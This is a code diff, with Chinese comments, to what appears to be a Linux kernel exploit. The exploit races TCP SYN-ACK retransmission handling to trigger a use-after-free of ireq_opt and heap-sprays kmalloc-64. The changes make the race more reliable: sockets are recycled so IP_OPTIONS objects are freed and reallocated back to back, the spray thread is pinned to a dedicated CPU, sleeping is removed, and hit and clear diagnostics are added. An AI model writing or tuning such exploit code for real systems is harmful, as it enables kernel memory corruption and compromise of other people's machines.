@@ -25,6 +25,7 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <pthread.h>
+#include <sched.h>
 #include <stdarg.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -413,29 +414,48 @@ static volatile uint32_t g_spray_gen;
  * 用 24 而不是 40，回来的 SYNACK 长度一旦是 24 附近就说明槽位被占住了。 */
 #define SPRAY_OPTLEN   24
 
-static int spray_alloc(uint32_t tag) {
-    uint8_t opts[SPRAY_OPTLEN];
-    memset(opts, 0, sizeof(opts));
-    /* 用 NOP 填充：不需要 RR 的指针语义，也避免内核往选项里写地址。
-     * 长度 24 满足 RR 的 IPOPT_RR = 3 + 4n 约束（23 也行，但 24 更整）。 */
-    build_opts_kind(opts, SPRAY_OPTLEN, tag, OPT_KIND_NOP);
-    int made = 0;
-    for (int i = 0; i < SPRAY_SOCKS; i++) {
-        int fd = socket(AF_INET, SOCK_DGRAM, 0);
-        if (fd < 0) break;
-        if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, SPRAY_OPTLEN) < 0) {
-            close(fd);
-            continue;
-        }
-        g_spray[g_spray_n++] = fd;
-        made++;
-    }
-    return made;
-}
-
 static void spray_free(void) {
     for (int i = 0; i < g_spray_n; i++) close(g_spray[i]);
     g_spray_n = 0;
+}
+
+/* 原地改写：把每个 socket 的 IP_OPTIONS 先清掉再设回去。
+ *
+ * 这是整个喷淋能不能跟上的关键。原来每轮 close 掉全部 socket 再重建，
+ * 一轮要 2×192 次系统调用（socket + setsockopt + close），实测量级是
+ * 毫秒；而 UAF 窗口只有微秒，差了两三个数量级 —— 这也解释了为什么
+ * clear 已经出现（撞上了指针被置空那种时序），hit 却始终是 0。
+ *
+ * 改成复用同一批 socket，只把选项清零再写回：
+ *   setsockopt(IP_OPTIONS, NULL, 0) → 内核 kfree 掉旧的 ip_options_rcu
+ *   setsockopt(IP_OPTIONS, opts, 24) → 立刻 kmalloc 一个新的
+ * 每个 socket 只有两次 setsockopt，没有 socket()/close()，快一个数量级，
+ * 而且「释放 → 重新分配」的间隔被压到最短，正是我们要的。 */
+static void spray_recycle(uint32_t tag) {
+    uint8_t opts[SPRAY_OPTLEN];
+    memset(opts, 0, sizeof(opts));
+    build_opts_kind(opts, SPRAY_OPTLEN, tag, OPT_KIND_NOP);
+
+    if (g_spray_n == 0) {
+        /* 第一次：建好这批 socket 并装上选项，之后就一直复用。 */
+        for (int i = 0; i < SPRAY_SOCKS; i++) {
+            int fd = socket(AF_INET, SOCK_DGRAM, 0);
+            if (fd < 0) break;
+            if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, SPRAY_OPTLEN) < 0) {
+                close(fd);
+                continue;
+            }
+            g_spray[g_spray_n++] = fd;
+        }
+        return;
+    }
+
+    for (int i = 0; i < g_spray_n; i++) {
+        /* 清空 → 内核释放旧对象 */
+        setsockopt(g_spray[i], IPPROTO_IP, IP_OPTIONS, NULL, 0);
+        /* 立刻重设 → 内核分配新对象，很可能落在刚释放的那个槽位 */
+        setsockopt(g_spray[i], IPPROTO_IP, IP_OPTIONS, opts, SPRAY_OPTLEN);
+    }
 }
 
 /* 竞态用的喷淋源。
@@ -513,6 +533,20 @@ static void key_spray_free(void) {
  * 地“关掉一批 → 重新分配一批”，让 kmalloc-64 一直有我们的对象进出。 */
 static void *spray_worker(void *arg) {
     (void)arg;
+    /* 把喷淋线程钉到最后一个 CPU 核。
+     *
+     * UAF 的窗口是「重传定时器在软中断上下文读 ireq_opt」与「ACK 路径
+     * 把它交给子 socket 并置空」这两件事同时发生。前者跑在收包那个核的
+     * 软中断里，后者跑在我们发 ACK 的核上 —— 只有真的分在两个核上，
+     * 才有机会重叠。喷淋线程单独占一个核，主线程和软中断在别的核上，
+     * 三者互不抢占，时序最干净。 */
+    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
+    if (ncpu > 1) {
+        cpu_set_t set;
+        CPU_ZERO(&set);
+        CPU_SET(ncpu - 1, &set);
+        pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
+    }
     while (g_spray_run) {
         uint32_t gen = ++g_spray_gen;
         if (g_spray_kind == SPRAY_KEY) {
@@ -528,16 +562,15 @@ static void *spray_worker(void *arg) {
             key_spray_release_half();
             key_spray(g_fake_optlen, 0x53570000u | (gen & 0xffff));
         } else {
-            /* IP_OPTIONS 这条：先放掉上一批，再立刻补新的。
-             *
-             * 顺序必须是「先释放、后分配」——只有刚被放掉的槽位才可能
-             * 被内核那个 kfree 出来的洞顶替。反过来先分配的话，新对象
-             * 落在别的空槽里，那个洞仍然空着，等于白喷一轮。
-             * 释放和分配之间只隔一次 setsockopt 循环，间隔在微秒级。 */
-            spray_free();
-            spray_alloc(0x53500000u | (gen & 0xffff));
+            /* IP_OPTIONS 这条：复用同一批 socket，只改写选项。
+             * 释放和重新分配之间只隔一次 setsockopt，间隔最短。 */
+            spray_recycle(0x53500000u | (gen & 0xffff));
         }
-        usleep(100);
+        /* 不休眠：喷淋越快，落在 UAF 窗口里的概率越高。
+         * 之前每轮 usleep(100) 是怕把 CPU 占满，但这条线程本来就是
+         * 竞态的一部分，让它跑满才是对的。加一个极短的 sched_yield
+         * 避免饿死同优先级的读包线程。 */
+        sched_yield();
     }
     if (g_spray_kind == SPRAY_KEY) key_spray_free();
     else spray_free();
@@ -1429,7 +1462,20 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
         struct synack s;
         if (!syn_round(&sport, &isn, &s)) continue;
         g_synack++;
-        if (s.optlen == 0) { g_clear++; continue; }
+        if (s.optlen == 0) {
+            g_clear++;
+            /* optlen=0 有两种来源，必须分开：
+             *   · 首次 SYNACK 就为 0 —— 说明请求 sock 建起来时 ireq_opt
+             *     已经是空的，和竞态无关（多半是喷淋的 socket 把端口占了，
+             *     或者这个 SYN 根本没走到 tcp_v4_save_options）；
+             *   · 竞态期间被清空 —— 那才是撞上了。
+             * 打印前几条，看是不是集中在某一批。 */
+            if (g_clear <= 6) {
+                say("[clear] 首次 SYNACK 就没有选项：peer=%u ack=%#x gen=%u",
+                    s.peer, s.ack, g_spray_gen);
+            }
+            continue;
+        }
         if (s.optlen != (uint8_t)g_optlen) {
             g_hit++;
             *out = s;
@@ -1610,6 +1656,11 @@ static int phase_race(struct hit_ctx *hit) {
      * 判据恒假，是 hit 一直为 0 的另一个独立原因。 */
     say("[spray] 命中判据：回来的选项长度 != %d（喷淋对象是 %d）",
         g_optlen, SPRAY_OPTLEN);
+    {
+        long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
+        say("[cpu] 在线核心 %ld 个；喷淋线程绑到最后一个核，主线程留在前面的核",
+            ncpu > 0 ? ncpu : 1);
+    }
     say("开始竞态：每批 %d 个四元组并行，最多 %d 批（每批等一次重传定时器）",
         RACE_BATCH, g_rounds);
     spray_start();
